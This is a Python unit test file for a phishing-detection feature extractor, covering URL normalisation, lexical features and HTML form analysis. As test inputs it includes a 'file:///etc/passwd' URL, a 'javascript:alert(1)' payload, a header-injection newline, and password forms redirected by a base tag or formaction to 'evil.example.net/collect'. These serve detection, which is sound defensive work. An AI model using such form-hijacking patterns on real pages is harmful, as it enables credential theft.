import unittest
from pathlib import Path
from feature_extraction import FEATURE_NAMES,InvalidURL,normalize_url,lexical_features,content_evidence,warning_signals

class FeatureTests(unittest.TestCase):
    def test_schema_exact_order(self):
        f=lexical_features('https://www.example.org/a?x=1')
        self.assertEqual(list(f),FEATURE_NAMES)
        self.assertEqual(len(f),25)
        self.assertEqual(f['qty_questionmark_url'],1)
        self.assertEqual(f['qty_equal_url'],1)
    def test_ip_host_only_not_path(self):
        self.assertEqual(lexical_features('https://example.org/127.0.0.1')['domain_in_ip'],0)
        self.assertEqual(lexical_features('http://8.8.8.8/a')['domain_in_ip'],1)
    def test_normalization(self):
        self.assertEqual(normalize_url(' WWW.Example.Org/a '),'https://www.example.org/a')
        self.assertTrue(normalize_url('https://bücher.de').startswith('https://xn--'))
    def test_bad_urls(self):
        for url in [None,1,{},[],True,'','file:///etc/passwd','ftp://example.org','javascript:alert(1)','https://user:secret@example.org','http://example.org:99999','http://bad host.org','https://example.org/\nHeader:bad','https://example.org\\@local','x'*2049]:
            with self.subTest(url_type=type(url).__name__):
                with self.assertRaises(InvalidURL):normalize_url(url)
    def test_url_signals(self):
        url='http://user@a.b.c.d.xn--bcher-kva.de/'+'a'*160
        flags={s['code'] for s in warning_signals(url,{})}
        self.assertTrue({'missing_https','userinfo','punycode','many_subdomains','long_url'}<=flags)
    def test_phishing_page_evidence(self):
        html=Path('tests/fixtures/phishing.html').read_text()
        evidence=content_evidence('https://www.example.org',html)
        self.assertTrue(evidence['external_password_form'])
        self.assertTrue(evidence['has_password_field'])
        self.assertTrue(evidence['has_suspicious_script'])
        self.assertEqual(evidence['form_count'],1)
        self.assertEqual(evidence['iframe_count'],1)
    def test_legitimate_fixture(self):
        html=Path('tests/fixtures/legitimate.html').read_text()
        evidence=content_evidence('https://www.example.org',html)
        self.assertFalse(evidence['external_password_form'])
        self.assertGreater(evidence['word_count'],10)
    def test_relative_form_and_base(self):
        same=content_evidence('https://site.example.org','<form action="/submit"><input type="password"></form>')
        self.assertFalse(same['external_password_form'])
        external=content_evidence('https://site.example.org','<base href="https://evil.example.net/"><form action="/submit"><input type="password"></form>')
        self.assertTrue(external['external_password_form'])
    def test_script_text_not_tokenized(self):
        evidence=content_evidence('https://example.org','<script>password password</script><style>password</style><p>Hello world</p>')
        self.assertEqual(evidence['suspicious_word_count'],0)
    def test_submit_formaction_override(self):
        page='<form action="/login"><input type="password"><button formaction="https://evil.example.net/collect">Login</button></form>'
        self.assertTrue(content_evidence('https://www.example.org',page)['external_password_form'])
    def test_unicode_path_is_transport_safe(self):
        self.assertEqual(normalize_url('https://bücher.de/über?q=café'),'https://xn--bcher-kva.de/%C3%BCber?q=caf%C3%A9')
        with self.assertRaises(InvalidURL):normalize_url('https://example.org/'+'界'*500)
    def test_password_without_form_does_not_invent_a_form(self):
        evidence=content_evidence('https://example.org','<input type="password">')
        self.assertTrue(evidence['has_password_field']);self.assertEqual(evidence['form_count'],0)
